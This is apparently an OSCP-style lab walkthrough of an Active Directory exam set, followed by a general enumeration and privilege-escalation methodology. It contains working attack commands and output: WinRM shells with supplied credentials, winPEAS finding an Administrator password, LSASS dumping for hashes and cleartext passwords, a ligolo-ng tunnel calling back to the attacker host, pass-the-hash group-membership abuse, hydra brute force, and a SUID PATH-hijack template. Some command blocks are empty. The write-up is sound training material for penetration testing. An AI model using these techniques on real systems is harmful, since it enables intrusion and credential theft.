192.168.91.206 — AD Fantom 1 · WS01 → DC20

01

Reconnaissance

One host, two networks

One routable host in the set. The interesting part is not the port list but the shape of it: a Windows box serving an Apache/PHP stack on 80 and MySQL on 3306 — i.e. a workstation running a web application, not a hardened server — plus RDP and WinRM. That combination is the whole box in one line: web app → database → local users.

Notes on the scan itself:

  • 5985/tcp is the one that matters: this is a WinRM box, not an RDP-first box.

1.3 Web surface

The title Home - OffSec SOC and the PHP/MySQL stack point at a small asset/helpdesk-style application. No browser session is needed: the chain goes straight to WinRM with the provided credential and reads config.php from disk instead of attacking the app. That is the faster path on this box: the source is already on the filesystem once you have a shell.

1.4 Hosts file habit

Add the name early; every later command reads better and avoids certificate/SMB name mismatches:

command
echo '192.168.91.206  WS01.oscp.exam WS01' | sudo tee -a /etc/hosts

02

Foothold

WinRM as andrew, then config.php and MySQL

The exam gives one credential for one machine. On this set it is a domain user, and that user is in Remote Management Users on WS01 — so SMB gets you a [+] and nothing else, while WinRM gets you a shell.

2.1 Validate the credential

command
nxc smb 192.168.91.206 -u 'landon' -p 'BussOff@theRiv3r'
output
SMB  192.168.91.206  445  WS01  [*] Windows 11 Build 22000 x64 (name:WS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB  192.168.91.206  445  WS01  [-] oscp.exam\landon:BussOff@theRiv3r STATUS_LOGON_FAILURE
command
nxc smb 192.168.91.206 -u 'andrew' -p 'BussOff@theRiv3r'
output
SMB  192.168.91.206  445  WS01  [*] Windows 11 Build 22000 x64 (name:WS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB  192.168.91.206  445  WS01  [+] oscp.exam\andrew:BussOff@theRiv3r

[+] without (Pwn3d!) = valid account, not local admin. That is the expected shape for a foothold account on a workstation.

2.2 WinRM

command
nxc winrm 192.168.91.206 -u 'andrew' -p 'BussOff@theRiv3r'
output
WINRM  192.168.91.206  5985  WS01  [*] Windows 11 Build 22000 (name:WS01) (domain:oscp.exam)
WINRM  192.168.91.206  5985  WS01  [+] oscp.exam\andrew:BussOff@theRiv3r (Pwn3d!)

For WinRM, netexec's (Pwn3d!) means this account can execute code here, not "domain admin". A plain Remote Management Users membership is enough.

command
evil-winrm -i 192.168.91.206 -u 'andrew' -p 'BussOff@theRiv3r'
output
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\andrew\Documents>

You are now a normal domain user on a domain-joined workstation. First question is always whoami /priv / whoami /groups; on this box the interesting find comes later from the filesystem, not from the token.

2.5 What this chapter deliberately does not do

  • No web-app exploitation. The source was already readable; attacking the login would have cost time for the same information.
  • No hash cracking. The bcrypt table is noted as loot, not as a path.

03

Privilege escalation

winPEAS reads the Administrator password

The box does not need a kernel bug or a token trick. It needs winPEAS and five minutes of reading. The local Administrator password is sitting in a machine environment variable.

3.1 Run winPEAS

Inside the andrew WinRM session:

command
.\winPEASx64.exe

The banner and the section that matters:

output
    ((,.,/((((((((((((((((((((/,  */
    /*,...................................*/

[...]

Environment Variables (T1082)
    ...
    [redacted]_PASSWORD: Work3sValueable444

Two notes on the values:

  • The environment variable is [redacted]_PASSWORD with the value Work3sValueable444; the same value appears again in the netexec line and the WinRM login.
  • The transfer method for winPEASx64.exe: [redacted]. Any of the usual routes works from an Evil-WinRM session, e.g. upload /opt/tools/winPEASx64.exe .

Why this works: exam authors plant exactly this kind of thing — a service account password, an installer's unattended answer file, or a machine-wide environment variable. winPEAS prints environment variables early, and they are cheap to read.

3.2 Validate the password as a local account

The password is for the local Administrator, so authenticate locally — not against the domain:

command
nxc smb 192.168.91.206 -u 'Administrator' -p 'Work3sValueable444' --local-auth
output
SMB  192.168.91.206  445  WS01  [*] Windows 11 Build 22000 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:None)
SMB  192.168.91.206  445  WS01  [+] WS01\Administrator:Work3sValueable444 (Pwn3d!)

Note the change in the domain field: (domain:WS01) and WS01\Administrator — a local logon. (Pwn3d!) here really does mean local administrator (admin share / code execution).

3.3 Shell as Administrator and the proof

command
evil-winrm -i 192.168.91.206 -u 'Administrator' -p 'Work3sValueable444'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt

Proof obtained (flag masked on purpose). Document it properly for the exam: one image that contains the command, the output and the host identity, plus copy-pasted text in the report. 04

Pivot & loot

ligolo-ng into 172.16.91.0/24, then lsassy

Two things happen after local admin:

  1. A ligolo-ng tunnel, so Kali can route to the internal /24 that only WS01 can see.
  2. An lsassy run as local admin, which dumps LSASS/LSA and produces the credential material for the next hop.

4.1 ligolo-ng — proxy side (Kali)

The proxy was started with a self-signed certificate and the default listener:

command
sudo ligolo-proxy -selfcert
output
INFO[0000] Listening on 0.0.0.0:11601
WARN[0000] self-signed certificate, domain 'ligolo', beware of CTL, SOC and IoC

The proxy command line: [redacted]. It listens on 11601 and prints the self-signed ligolo warning. If you prefer -laddr, the agent string below is what has to match.

Create the tun interface once per session:

command
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

4.2 ligolo-ng — agent side (WS01)

The Linux agent binary is not useful here; the Windows build is dropped on WS01 and executed from the Administrator WinRM session:

command
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ./agent -connect 192.168.49.91:11601 -ignore-cert
output
level=info msg="Connection established" addr="192.168.49.91:11601"

192.168.49.91 is the Kali address on the ligolo tun (the proxy endpoint). -ignore-cert is required because the proxy is self-signed.

05

Lessons

What the set teaches about the exam

The value of this set is not the commands — it is the order in which they are used. Each step below is a decision that saved time, and each one generalises to the next AD box.

5.1 Order of work

  • AD first. It is a chain of small, well-signposted steps and it carries a large share of the points. Doing it while fresh beats doing it at hour 20.
  • The initial nmap is not the scoring event, but keep it: the report needs the scan, and the service list is what tells you this is a WinRM box.
  • The exam hands you one credential at the start. Spend the first five minutes validating it against SMB then WinRM — that is the whole foothold decision on this set.

5.2 Do not fall into the database

  • A bcrypt table on a workstation is loot, not a path. Note it, save the output, move on.
  • If you ever do crack, do it on the Windows host (or with hashcat on the GPU box) and in the background — never sit and watch it.
  • The fastest win on this box was not the web app at all: it was winPEAS reading an environment variable.

5.3 winPEAS early

Run it immediately after the first shell, before custom enumeration. The finding here is a machine-level environment variable containing the local Administrator password — the kind of thing a hand-written enumeration script will miss if you only look at services and ACLs.

5.4 Proof handling (the part people lose points on)

The report is scored as much as the shell. Capture each flag while you are still on the host that holds it, and capture it in a way that survives scrutiny:

  1. One image per flag that shows the command, the output, and the host together (hostname, whoami, ipconfig, then type proof.txt).
  2. The same content copy-pasted as text into the report — graders want to copy commands.
  3. Do it at the moment you get the flag, not at the end from memory.

An image of a flag without the command and hostname beside it is exactly the kind of evidence a grader can dispute.

5.5 Tunneling

  • ligolo-ng here; chisel is equally acceptable — the exam does not reward the tool.
  • One route into 172.16.91.0/24 is the requirement. No double pivot, no proxy chains.
  • Start the tunnel as soon as you have local admin, before you need it. It costs two minutes and removes a whole class of "why can't I reach the DC" confusion.

5.6 With local admin, dump before you leave

  • Local admin on the dual-homed box is the collection point: LSASS/LSA on WS01 held a domain credential in cleartext.
  • nxc … -M lsassy (or secretsdump.py) is a two-minute step that often replaces an hour of guessing on the next host. Do it before pivoting away.

5.7 Checklist distilled

| Phase | Command | Done | |---|---|---|---| | Validate creds | nxc smb <ip> -u user -p pass | ☐ | | Shell | nxc winrm … / evil-winrm | ☐ | | Local config | cat config.php, MySQL tables | ☐ | | Privesc | winPEASx64.exe → env vars | ☐ | | Admin check | nxc smb … --local-auth | ☐ | | Proof | hostname; whoami; type proof.txt in one image | ☐ | | Second NIC | ipconfig | ☐ | | Tunnel | ligolo-ng start + ip route add | ☐ | | Loot | nxc … -M lsassy / secretsdump | ☐ |

06

DC20

Pass-the-hash, ACL abuse, KeePass, domain admin

Everything after WS01 happens with perry, a plain domain user who turns out to have two useful properties: a hash that works as a password, and the WriteMembers right on a helpdesk group that is local admin on the next server. The DC itself is never brute-forced — it falls to a password that was sitting in someone's KeePass database.

Note. Long commands wrap at the terminal width; the flags are masked.

6.1 The hash is enough

lsassy on WS01 returned perry's NT hash. The same run also captured the cleartext line, which is what the later steps use:

output
WS01\l.andrew      58836e8b8f091253ae14d4115e6d7704
WS01\Administrator 289f3285a8f5d524e535c29917f2ea06
WS01\l.perry       0acba8f16de9d8d6b0d6c725356c3c2
OSCP.EXAM\perry    SurfaceConditionMove441
Value Status
0acba8f16de9d8d6b0d6c725356c3c2 read from a bloodyAD --hashes line — reliable
SurfaceConditionMove441 repeated in the lsassy line, net rpc and nxc — reliable

Note the word: Surface, not Race. The two are easy to confuse; the hash line confirms it.

Knowing the hash is enough, but the cleartext is better: secretsdump as the local Administrator on WS01 recovers it directly.

command

6.3 BloodHound

Collected with perry's credentials. The run output:

output
[*] Verbosity level: Info
[*] Collection method: All
[+] Connected to OSCP.EXAM ACTIVE DIRECTORY
[*] All data collected for NamingContext DC=oscp,DC=exam
[*] All data collected for NamingContext DC=DomainDnsZones,DC=oscp,DC=exam

[*] All data collected for NamingContext CN=Configuration,DC=oscp,DC=exam

The path it produced: perry → (control) → HELPDESK USERS, with the group carrying a membership edge. In BloodHound terms this is the classic WriteMembers / AddMember edge — a user who can rewrite the member list of a group.

Why it matters: HELPDESK USERS is in the local Administrators group of SRV22. Rewriting that group's membership is therefore equivalent to local admin on SRV22 — without touching a single password.

6.4 Do it with bloodyAD

command

  --action write --rights WriteMembers --principal perry \
  --target-dn 'CN=HELPDESK USERS,CN=USERS,DC=oscp,DC=exam' \
  --hashes 0acba8f16de9d8d6b0d6c725356c3c2

The --hashes argument is what makes this a pass-the-hash ACL edit. Two things are certain: the action/rights/principal/target-DN arguments, and the --hashes value above.

6.5 Do it again with net rpc (and the password)

command

  -U 'oscp.exam\perry%SurfaceConditionMove441' -S 'DC20.oscp.exam'

The first attempt fails — the -U argument is mis-quoted (-U 'oscp.exam'%'…'). The corrected line, which succeeds, is the one above. Two lessons: quote the whole domain\user%password string, and net rpc needs the DC in -S, not a member server.

08

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.
